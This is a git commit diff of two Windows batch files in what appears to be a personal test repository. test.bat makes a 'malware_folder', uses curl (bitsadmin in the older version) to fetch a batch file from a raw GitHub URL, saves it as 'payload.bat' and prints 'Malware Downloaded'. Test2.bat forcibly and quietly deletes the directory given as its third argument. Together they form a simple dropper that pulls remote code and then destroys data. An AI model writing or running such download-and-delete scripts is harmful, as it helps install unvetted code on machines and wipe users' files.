0bde63bc98c2efb2c00e4b892fbca0b5a417e7f7
duydang2002 <76654292+duydang2002@users.noreply.github.com>
2024-12-25 10:47:56 +0700

    update

--- Test2.bat
+++ Test2.bat
@@ -2,5 +2,4 @@
 echo this is first block %1
 echo this is second block %2
 echo this is third block %3
-
 rmdir /s /q %3
--- test.bat
+++ test.bat
@@ -1,10 +1,10 @@
-
 @echo off
 
 echo Hello, this is a BAT file!
-set path = C:\Users\Public\malware_folder
-mkdir path
-bitsadmin /transfer download https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/test.bat path/payload.bat
-echo Malware Dowloaded.
-call path Code1, Code2, path
+set path=C:\Users\Public\malware_folder
+mkdir %path%
+echo %path%
+curl -o %path%\payload.bat https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/Test2.bat
+echo Malware Downloaded
+
 pause
